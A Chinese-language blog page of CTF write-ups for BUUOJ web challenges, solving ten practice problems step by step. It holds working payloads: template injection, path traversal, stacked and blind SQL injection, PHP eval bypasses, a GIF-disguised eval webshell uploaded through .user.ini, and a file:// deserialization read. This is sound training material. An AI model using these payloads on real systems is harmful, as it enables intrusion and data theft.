<!DOCTYPE html>
<html lang=zh-TW>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="想了很久怎麼給自己一點刷題動力，感覺得靠興趣驅使。再加上有點想垂直上分，也增加一點技術力，所以就開了這波實時更新的小合集。有一部分的環境會嘗試自己去搭建。（想改善一下玩 Docker 的技術力，而且也想收集一下題目原本很好玩的 flag）還有部分題目會被單獨分離出來（譬如咱打過的比賽啥的），所以並不完整，嘿嘿。 [護網杯 2018]easy_tornado首先分別點進提供的三個頁面，收集一波 hi">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUOJ Web 一分題 WriteUp 合集">
<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html">
<meta property="og:site_name" content="Hexagon">
<meta property="og:description" content="想了很久怎麼給自己一點刷題動力，感覺得靠興趣驅使。再加上有點想垂直上分，也增加一點技術力，所以就開了這波實時更新的小合集。有一部分的環境會嘗試自己去搭建。（想改善一下玩 Docker 的技術力，而且也想收集一下題目原本很好玩的 flag）還有部分題目會被單獨分離出來（譬如咱打過的比賽啥的），所以並不完整，嘿嘿。 [護網杯 2018]easy_tornado首先分別點進提供的三個頁面，收集一波 hi">
<meta property="og:locale" content="zh_TW">
<meta property="article:published_time" content="2020-04-25T11:08:30.000Z">
<meta property="article:modified_time" content="2021-04-28T08:28:43.948Z">
<meta property="article:author" content="LemonPrefect">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/avatar.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
        
      
    
    <!-- title -->
    <title>BUUOJ Web 一分題 WriteUp 合集</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/zh-TW/">首頁</a></li>
         
          <li><a href="/zh-TW/archives/">文章</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">關於</a></li>
         
          <li><a href="/search/">搜尋</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        <!-- 
        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/9b2fbf24.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/d24ddcdc.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        --!>

        
          
          
          
            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/d24ddcdc.html">简</a></li>
          
            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
          
        

        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">回到頁首</span>
      <span id="i-share" class="info" style="display:none;">分享</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&text=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&is_video=false&description=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BUUOJ Web 一分題 WriteUp 合集&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&title=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&name=BUUOJ Web 一分題 WriteUp 合集&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/d24ddcdc.html&t=BUUOJ Web 一分題 WriteUp 合集"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AD%B7%E7%B6%B2%E6%9D%AF-2018-easy-tornado"><span class="toc-number">1.</span> <span class="toc-text">[護網杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B7%E7%B6%B2%E6%9D%AF-2019-%E9%9A%A8%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">[強網杯 2019]隨便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">4.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">5.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">6.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E8%8F%AF%E5%8C%97%E8%B3%BD%E5%8D%80-Day2-Web1-Hack-World"><span class="toc-number">8.</span> <span class="toc-text">[CISCN2019 華北賽區 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B6%B2%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">9.</span> <span class="toc-text">[網鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">10.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">11.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">12.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B3%BD-Include"><span class="toc-number">13.</span> <span class="toc-text">[ACTF2020 新生賽]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B3%BD-Exec"><span class="toc-number">14.</span> <span class="toc-text">[ACTF2020 新生賽]Exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">15.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">16.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B3%BD-BackupFile"><span class="toc-number">17.</span> <span class="toc-text">[ACTF2020 新生賽]BackupFile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E6%A8%B8%E5%AF%A6%E7%84%A1%E8%8F%AF"><span class="toc-number">18.</span> <span class="toc-text">[WUSTCTF2020]樸實無華</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E9%A1%8F%E5%80%BC%E6%88%90%E7%B8%BE%E6%9F%A5%E8%A9%A2"><span class="toc-number">19.</span> <span class="toc-text">[WUSTCTF2020]顏值成績查詢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E8%8F%AF%E6%9D%B1%E5%8D%97%E8%B3%BD%E5%8D%80-Web11"><span class="toc-number">20.</span> <span class="toc-text">[CISCN2019 華東南賽區]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">21.</span> <span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">22.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B6%B2%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">23.</span> <span class="toc-text">[網鼎杯 2018]Comment</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        BUUOJ Web 一分題 WriteUp 合集
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">LemonPrefect</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-04-25T11:08:30.000Z" itemprop="datePublished">2020-04-25</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>想了很久怎麼給自己一點刷題動力，感覺得靠興趣驅使。再加上有點想垂直上分，也增加一點技術力，所以就開了這波實時更新的小合集。有一部分的環境會嘗試自己去搭建。（想改善一下玩 Docker 的技術力，而且也想收集一下題目原本很好玩的 flag）還有部分題目會被單獨分離出來（譬如咱打過的比賽啥的），所以並不完整，嘿嘿。</p>
<h3 id="護網杯-2018-easy-tornado"><a href="#護網杯-2018-easy-tornado" class="headerlink" title="[護網杯 2018]easy_tornado"></a>[護網杯 2018]easy_tornado</h3><p>首先分別點進提供的三個頁面，收集一波 hint，可以得到 <code>md5(cookie_secret+md5(filename))</code> <code>flag in /fllllllllllllag</code> 這兩個提示，還有一個 <code>render</code>。因為提示了是 tornado 的模板注入，但是接觸得比較少，於是就查了一下，找到了這樣的內容。</p>
<blockquote>
<p>在tornado模板中，存在一些可以訪問的快速物件，例如 {{ escape(handler.settings["cookie"]) }}</p>
<p>handler 指向 RequestHandler</p>
<p>而 RequestHandler.settings 又指向 self.application.settings</p>
<p>所有 handler.settings 就指向 RequestHandler.application.settings 了！</p>
</blockquote>
<p>但是目前是沒有利用點的。這個時候，把題目的 GET 引數一通亂改之後出現了一個報錯頁面。欸，好機會！構造了一個 <code>error?msg=&#123;&#123;7*'7'&#125;&#125;</code> 結果返回了 ORZ。基本上確定是利用點了，但是我還是想確定一下，於是構造了 <code>error?msg=&#123;&#123;~1&#125;&#125;</code>，得到了 -2 的反饋，於是得以確認。根據上面查到的結果，構造 <code>error?msg=&#123;&#123;handler.settings&#125;&#125;</code> 得到 <code>cookie_secret</code> 為 <code>cae74968-3bf4-4be4-8505-e2db1c865c15</code>。根據上面的 hint 構造 <code>filename=/fllllllllllllag&amp;filehash=6740f481f040fa14e844929205445908</code> 即可得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f69df34c-c28c-4aa9-9bfe-7e73f9e61690&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>首先看了一波原始碼，找到 source.php 然後 source 可讀，其中還有個 hint.php。於是去看 hint.php，得到了一個提示 <code>flag not here, and flag in ffffllllaaaagggg</code>。這裡有一個點，因為一開始的構造決定了前兩個檢驗必不可能 true，因此只能看後面 url 解碼之後的校驗，那就要保證構造能安全地透過這兩個地方而不被截斷。因為原始碼會不斷地嘗試擷取問號前面的內容（當沒有問號就在最後接一個問號然後截斷，也就是相當於沒有截斷），因此只要在 <code>source.php</code> 後面編碼一個問號 <code>%3f</code>，就能達成在解碼後再截斷的目的，從而可以透過 <code>in_array($_page, $whitelist)</code> 的檢驗從而返回 true。接下來就是目錄穿越一波，構造 <code>?file=source.php?/../../../../../../ffffllllaaaagggg</code> 得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;e8a73a09cfdd1c9a11cca29b2bf9796f&#125;</span><br></pre></td></tr></table></figure>

<h3 id="強網杯-2019-隨便注"><a href="#強網杯-2019-隨便注" class="headerlink" title="[強網杯 2019]隨便注"></a>[強網杯 2019]隨便注</h3><p>既然是隨便注嘛，上手試試看 <code>1&#39;#</code> 發現顯示是正常的，於是進一步構造 <code>1&#39; union select 1,2,3 #</code> 然後就被 <code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code> 擋下來了。因為沒得 <code>select</code> 了，查了一下，堆疊注入比較靠譜，於是構造一波 <code>1&#39;;show databases;#</code> 得到了正確的反饋。於是 <code>1&#39;;show tables;#</code>，看到了一個很可疑的表 <code>1919810931114514</code>。用 <code>1&#39;;desc `1919810931114514`;#</code> 查一波這個表的結構可以發現 flag 的欄位。</p>
<p>關鍵在於如何去讀取它，查了一波之後發現可以悄悄地把表換掉，於是打出一套組合操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RENAME TABLE &#96;words&#96; TO &#96;wordstmp&#96;;</span><br><span class="line">RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;</span><br><span class="line">ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br></pre></td></tr></table></figure>

<p>這樣之後，預設所查的 words 表就變成了包含 flag 的表，這個時候隨便構造個 <code>1&#39; or 1=1#</code>一讀就能拿到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d2d32fa6-a7b4-44d0-8648-71ae2f1d1353&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>氦，這題我是真的寫不出來，查了一波發現很多師傅說這題可以查到原始碼，但是我怎麼掃都掃不出QAQ。對照著看了一波，發現需要把原本的 <code>||</code> 安排掉。這點使用 <code>PIPES_AS_CONCAT</code> 可以達成，於是構造 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> 成功拿到 flag。</p>
<p>原始碼中的 sql 語句是 <code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code>，構造之後就變成了三句語句。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>這題在修改密碼的頁面給了個註釋 hint，定向到 GitHub，上面有題目的原始碼。好奇的我看了一波同用戶的其他 repo，找到了這題的環境，然後在 readme 看到了考點，於是順著一找，找到了 <a target="_blank" rel="noopener" href="http://sunsec.top/2018/11/15/HCTF%20admin/">這篇文章</a>。於是就註冊一波 <code>ᴬᴰᴹᴵᴺ</code> 然後登入再修改密碼，再用 <code>admin</code> 和修改的密碼登入即可得到 flag。</p>
<p>關於對於 Unicode 字元的生成可以參考 <a target="_blank" rel="noopener" href="https://unicode-table.com/en/1D2C/">這個頁面</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;un1cOdE_cHe4t_1s_FuNnying&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>首先隨便算一個數，然後看看請求，發現請求給了 calc.php。嘗試直接訪問，發現原始碼。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用點就是最後的 <code>eval()</code>。這波沒給引號，於是有兩種方案：使用 <code>chr()</code> 配合 ASCII 來構造，或者使用 hex 和按位取反來構造（這個是後來看<a target="_blank" rel="noopener" href="http://www.pdsdt.lovepdsdt.com/index.php/2019/10/15/2019_roarctf-writeup-ginkgo/#0x01_easy_calc">這個題解</a>的時候學到的。但是構造成 <code>?num=1;var_dump(scandir(chr(47)));</code> 之後 403 了。於是返回去看，發現首頁原始碼中提了一句 WAF。於是順手查了一波，發現可以使用一個空格去繞過。於是構造 <code>?%20num=1;var_dump(scandir(chr(47)));</code>，成功得到反饋。得到 <code>f1agg</code> 的線索。於是接下來構造 <code>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code> 來讀取這個檔案，成功得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d7899aa0-16b1-4752-95f5-b9c5037caffa&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>啊，是看起來很熟悉的上傳檔案。老套路，構造好之後上傳再用蟻劍連線就行。這裡有一個要點，就是使用 .user.ini 來實現載入 php 檔案之前載入一個指定的檔案。</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line"><span class="comment">#define width 10</span></span><br><span class="line"><span class="comment">#define height 10</span></span><br><span class="line"><span class="attr">auto_prepend_file</span>=flag.jpg <span class="comment">#append for after </span></span><br></pre></td></tr></table></figure>

<p>在 flag.jpg 裡寫上一句話。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.jpg</span></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>上傳之後根據反饋可以知道 index.php 檔案也與上傳的檔案位於一個目錄下，因此只需要訪問 index.php 即可達到目的。於是蟻劍訪問 <code>.../uploads/48cd8b43081896fbd0931d204f947663/index.php</code> 然後開啟檔案管理即可得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;U5er_1n1_01d_TR1ck&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CISCN2019-華北賽區-Day2-Web1-Hack-World"><a href="#CISCN2019-華北賽區-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 華北賽區 Day2 Web1]Hack World"></a>[CISCN2019 華北賽區 Day2 Web1]Hack World</h3><p>這題，稍微試了一下之後發現是盲注，找了一下真和假的標記，掏出之前的二分模板，構造 <code>$sql = &quot;(ascii(substr((select(flag)from(flag)),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0&quot;;</code>  一頓懟，就能跑出 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f6bbbf99-0f93-4687-b2a4-5afc16dab5f5&#125;</span><br></pre></td></tr></table></figure>

<h3 id="網鼎杯-2018-Fakebook"><a href="#網鼎杯-2018-Fakebook" class="headerlink" title="[網鼎杯 2018]Fakebook"></a>[網鼎杯 2018]Fakebook</h3><p>首先上來一頓操作之後發現了 <code>/view.php?no=1</code> 這個注入利用點，一頓操作之後會發現 flag 根本不在資料庫裡，反而是一段序列化的字串存在 <code>data</code> 欄位。畢竟是網鼎杯，當然沒有那麼簡單。嘗試幾下沒有反饋之後查了一下，發現這題是有原始碼洩露的，於是下載下來。很容易發現是個反序列化，但是它有點不一樣，但是主要的利用點在 <code>blog</code> 這個欄位。當時的我並不知道要讀啥檔案，後來看了很多文章，有師傅說能掃出 flag.php。<span class="heimu" title="我太菜了">我還是太菜了</span></p>
<p>於是這裡就能接著往下構造了，我隨便序列化了一下，得到了 <code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>，然後就是接著注入啦。按照一般套路，先構造 <code>select/**/1,2,3,4</code> 看看回顯在哪裡，然後可以看到在 2 的地方。然後就是想辦法使回顯按照我們序列化的欄位來。因此，只需要構造 <code>.../view.php?no=2333/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; /**/from/**/users%23</code>。這樣頁面就會嘗試讀取 flag.php。然後檢視頁面原始碼，然後 base64 解碼即可得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9e34256a-b20b-4776-86d0-bbebd2aecd02&#125;</span><br></pre></td></tr></table></figure>

<h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>這題首先就給了原始碼，複製下來仔細地整理（這裡我就不貼了，佔版面，網上一搜就有）。首先因為定義了 <code>waf()</code> 導致不能使用 <code>gopher</code> 和 <code>file</code>。但這同時也給了我們一個指向性資訊，結合 hint 可知我們需要做的是讀取檔案 flag.txt。</p>
<p>不難發現向 <code>/Delta</code> 傳送請求最後可以執行到 <code>Exec()</code> 從而讀檔案。因此需要三個引數，準確地來說有兩個是 Cookie。接下來看 <code>Exec()</code>，要讀取檔案並輸出的話需要在引數 <code>action</code> 中包含 <code>read</code> 和 <code>scan</code>。於是構造 <code>action=readscan</code>。<code>param</code> 自然就是 <code>flag.txt</code>。接下來就是解決 <code>sign</code> 的環節。</p>
<p>題目給出了一個路由 <code>/geneSign</code> 用來生成 <code>sign</code>，需要的是 <code>action</code> 和 <code>param</code>，但是這裡的 <code>action</code> 被固定了，不好下手。跟著程式碼來到 <code>getSign()</code>，發現了拼接 <code>secert_key + param + action</code>，於是只要把原本請求裡的 <code>param</code> 構造成 <code>flag.txtread</code> 就能生成對應的可用 <code>sign</code> 了。</p>
<p>將生成的 <code>sign</code> 跟上述的兩個引數一起以對應的形式向 <code>/Delta</code> 發起請求即可得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4b706878-1516-4a40-9aea-1f393a4b1650&#125;</span><br></pre></td></tr></table></figure>

